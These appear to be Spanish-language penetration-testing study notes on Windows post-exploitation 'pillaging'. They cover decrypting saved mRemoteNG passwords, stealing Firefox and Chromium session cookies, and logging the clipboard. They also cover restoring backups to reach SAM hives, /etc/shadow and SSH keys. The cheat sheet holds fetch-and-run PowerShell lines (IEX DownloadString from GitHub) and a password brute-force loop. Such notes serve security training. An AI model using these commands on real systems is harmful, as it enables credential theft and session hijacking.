---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- Pillaging es la fase post-explotación enfocada en extraer información valiosa (credenciales, configuraciones, datos sensibles) de un host ya comprometido para escalar privilegios o moverse lateralmente.
- Fuentes típicas: apps instaladas, clientes RDP/SSH (mRemoteNG), navegadores (cookies), portapapeles, servidores de backup, shares, bases de datos, AD/Azure AD, servidores de código fuente, CA, etc.
- Muchas herramientas de gestión remota y mensajería guardan credenciales/tokens en archivos de configuración o bases de datos locales cifradas con claves predecibles o derivadas de DPAPI; el objetivo es localizar esos artefactos y descifrarlos.
- Los servidores de Backup son objetivos de alto valor: comprometer la cuenta/servicio de backup suele dar acceso administrativo a TODO lo que se respalda (DC, SQL, file servers, etc.).

## Herramientas Clave

| Herramienta | Propósito |
|---|---|
| `dir` / `ls` | Enumeración rápida de aplicaciones instaladas en Program Files. |
| PowerShell + Registro (`HKLM:\...\Uninstall`) | Enumeración granular de software instalado (incluye versión y ruta), cubre apps 32 y 64 bit. |
| mRemoteNG / `confCons.xml` | Cliente RDP/VNC/SSH que guarda credenciales cifradas localmente. |
| `mremoteng_decrypt.py` | Script para descifrar contraseñas guardadas por mRemoteNG (master pass por defecto o custom). |
| `cookieextractor.py` | Extrae cookies de la base SQLite de Firefox (`cookies.sqlite`). |
| Cookie-Editor (extensión navegador) | Inyecta una cookie robada en el navegador del atacante para suplantar sesión. |
| Invoke-SharpChromium (S3cur3Th1sSh1t) | Carga SharpChromium en memoria vía reflection para descifrar/extraer cookies de Chromium (usa DPAPI). |
| Invoke-Clipboard / Invoke-ClipboardLogger | Monitorea y registra el contenido del portapapeles (útil contra password managers, evade keyloggers). |
| restic | Software de backup multiplataforma; si se compromete, permite leer/restaurar backups completos de la red. |
| Mimikatz / Metasploit keylogging | Mencionados como alternativas para captura de credenciales. |

## Metodología Paso a Paso

### 1. Enumeración de Aplicaciones Instaladas
Identificar software instalado para detectar clientes de gestión remota, IM, password managers, etc. Empezar con revisión rápida de directorios y luego ir al registro para una lista completa (incluye apps de 32 bits en sistema de 64 bits vía `Wow6432Node`).

### 2. Extracción de Credenciales de mRemoteNG
mRemoteNG guarda conexiones (host, usuario, dominio, password cifrada) en `confCons.xml`. Si el usuario no configuró una master password custom, se usa una hardcodeada (`mR3m`) que permite descifrar directamente. Si hay master password custom, hay que conocerla o bruteforcearla contra el atributo `Protected` (clave maestra) o contra el atributo `Password` de un nodo (credencial específica).

### 3. Robo de Cookies de Sesión para Apps Web/IM (ej. Slack)
Si no se puede obtener la contraseña en texto claro (MFA, etc.), se roba la cookie de sesión del navegador y se inyecta en el navegador del atacante para secuestrar la sesión sin necesidad de credenciales.
- **Firefox**: las cookies están en SQLite sin cifrado fuerte → copiar `cookies.sqlite` y extraer con script.
- **Chromium (Chrome/Edge)**: las cookies están cifradas con DPAPI → se necesita ejecutar la rutina de descifrado en el contexto del usuario comprometido (no se puede solo copiar el archivo y leerlo offline fácilmente); para esto se usa SharpChromium en memoria.
- Tras obtener el valor de la cookie, se inyecta en el navegador propio (Cookie-Editor) y se refresca la página objetivo para quedar autenticado como la víctima.

### 4. Monitoreo del Portapapeles
Cuando se usan password managers (copy/paste), el keylogging no captura nada porque no hay tecleo. Se inyecta un logger de portapapeles en memoria que espera pacientemente a que la víctima pegue credenciales, tokens 2FA, URLs internas, etc.

### 5. Explotación de Servidores/Software de Backup (ejemplo: restic)
Si se compromete un host con un agente/servidor de backup, se puede listar, leer y restaurar copias de seguridad de otros sistemas críticos (DC, SQL, etc.) sin tocar el sistema original. Flujo: localizar el repositorio → inicializarlo/abrirlo con la contraseña → listar snapshots → restaurar el snapshot de interés → buscar dentro archivos sensibles (SAM/SYSTEM hives en Windows, `/etc/shadow` y `.ssh` en Linux, `web.config`, etc.).

## Cheat Sheet de Comandos

### Enumeración de aplicaciones instaladas
```cmd
:: Listado rápido de software via directorios estandar (32/64 bit)
C:\>dir "C:\Program Files"
C:\>dir "C:\Program Files (x86)"
```

```powershell
# Enumeracion granular via registro: apps de 64 bits
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

# Suma apps de 32 bits corriendo en sistema de 64 bits (Wow6432Node)
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

# Filtra entradas vacias, ordena y muestra en tabla legible
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

### mRemoteNG - Localizar y descifrar credenciales
```powershell
# Ubicacion por defecto del archivo de configuracion de mRemoteNG
ls C:\Users\<USER>\AppData\Roaming\mRemoteNG
# Ver contenido (confCons.xml contiene Protected= y Password= por nodo)
cat C:\Users\<USER>\AppData\Roaming\mRemoteNG\confCons.xml
```

```bash
# Descifrar password de un nodo SIN master password custom (usa la hardcodeada mR3m internamente)
python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD_STRING>"

# Descifrar password de un nodo CON master password custom conocida
python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD_STRING>" -p "<MASTER_PASSWORD>"

# Bruteforce de la master password (contra atributo Protected o Password) usando wordlist
for password in $(cat /usr/share/wordlists/<WORDLIST>.txt); do
  echo $password
  python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD_STRING>" -p $password 2>/dev/null
done
```

### Robo de cookies - Firefox
```powershell
# Copia la base de datos de cookies de Firefox (el nombre de perfil tiene parte random, usar wildcard)
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

```bash
# Extrae la cookie de sesion (ej. cookie 'd' usada por Slack) desde la base SQLite copiada
python3 cookieextractor.py --dbpath "<PATH_TO_COOKIES.SQLITE>" --host <TARGET_DOMAIN> --cookie <COOKIE_NAME>
```

### Robo de cookies - Navegadores basados en Chromium (Chrome/Edge)
```powershell
# Carga SharpChromium en memoria via reflection (PowerSharpPack)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

# Si falla por ruta hardcodeada distinta a la version actual de Chrome, copiar el archivo a la ruta esperada
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

# Extrae y descifra (DPAPI) las cookies del dominio objetivo, salida en JSON
Invoke-SharpChromium -Command "cookies <TARGET_DOMAIN>"
```

### Monitoreo del portapapeles
```powershell
# Descarga y carga en memoria el script de monitoreo de portapapeles
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

# Inicia el logger; queda esperando capturas de copy/paste (credenciales, tokens 2FA, URLs)
Invoke-ClipboardLogger
```

### Explotación de backups con restic
```powershell
# Crea el directorio del repositorio e inicializa el repo restic (pide password del repo si RESTIC_PASSWORD no esta seteada)
mkdir <REPO_PATH>; restic.exe -r <REPO_PATH> init

# Setea la password del repositorio como variable de entorno (evita prompts interactivos)
$env:RESTIC_PASSWORD = '<PASSWORD>'

# Backup normal de un directorio
restic.exe -r <REPO_PATH> backup <TARGET_DIRECTORY>

# Backup de directorios "en uso" por el SO (ej. C:\Windows) usando snapshot VSS
restic.exe -r <REPO_PATH> backup <TARGET_DIRECTORY> --use-fs-snapshot

# Lista los snapshots disponibles en el repositorio (IDs, host, paths)
restic.exe -r <REPO_PATH> snapshots

# Restaura un snapshot especifico por su ID a una ruta destino
restic.exe -r <REPO_PATH> restore <SNAPSHOT_ID> --target <RESTORE_PATH>
```

## "Gotchas" y Troubleshooting

- **mRemoteNG**: si el usuario nunca configuró una master password personalizada, se usa la hardcodeada `mR3m`, lo que permite descifrar directamente con `-s` sin `-p`.
- **mRemoteNG / error de descifrado**: un `ValueError: MAC check failed` al ejecutar `mremoteng_decrypt.py` indica que la master password usada (o ausente) es incorrecta.
- **mRemoteNG / bruteforce**: se puede crackear el atributo `Protected` (master password global) o el atributo `Password` de un nodo concreto; al encontrar la password correcta sobre `Protected` el output literal será `Password: ThisIsProtected` (no es un error, es la clave del cifrado raíz).
- **Ruta de confCons.xml**: por defecto en `%USERPROFILE%\AppData\Roaming\mRemoteNG`.
- **Cookies en Chromium**: SharpChromium puede tener rutas hardcodeadas desactualizadas (ej. busca en `Default\Cookies` pero Chrome moderno guarda en `Default\Network\Cookies`); si falla con "Could not find file", copiar el archivo a la ruta esperada antes de reintentar.
- **Cookies pegadas manualmente**: al copiar/pegar el valor de una cookie en Cookie-Editor, verificar que quede en una sola línea (saltos de línea rompen el valor).
- **Portapapeles vs Keylogging**: cuando se usan password managers (copy/paste en vez de teclear), el keylogging tradicional no captura nada; usar monitoreo de portapapeles en su lugar.
- **restic / variable de entorno**: si `RESTIC_PASSWORD` no está seteada, el binario pedirá la contraseña de forma interactiva para CUALQUIER operación sobre el repo (init, backup, snapshots, restore).
- **restic / VSS**: usar `--use-fs-snapshot` para respaldar archivos bloqueados por el SO; aun así, algunos archivos (ej. hives en `System32\config`) pueden devolver "Access is denied" — el snapshot/backup se crea igualmente pero sin contenido.
- **restic / estructura de restore**: al restaurar, la ruta original se reconstruye con la letra de unidad como carpeta, ej. `C:\SampleFolder` termina en `<RESTORE_PATH>\C\SampleFolder`.
- **restic en Linux**: si no se conoce la ubicación del repositorio, buscar en el filesystem un directorio llamado `snapshots`; la variable de entorno puede no estar seteada, en cuyo caso restic pedirá la password interactivamente.
- **Objetivos dentro de un backup restaurado (Windows)**: priorizar hives `SAM` y `SYSTEM` (extracción de hashes locales) y archivos como `web.config` (credenciales de apps web).
- **Objetivos dentro de un backup restaurado (Linux)**: priorizar `/etc/shadow` y directorios `.ssh` (claves privadas).
- **Enumeración de apps instaladas**: revisar `Program Files` Y `Program Files (x86)`; el método de registro (incluyendo `Wow6432Node`) es más completo que solo listar directorios.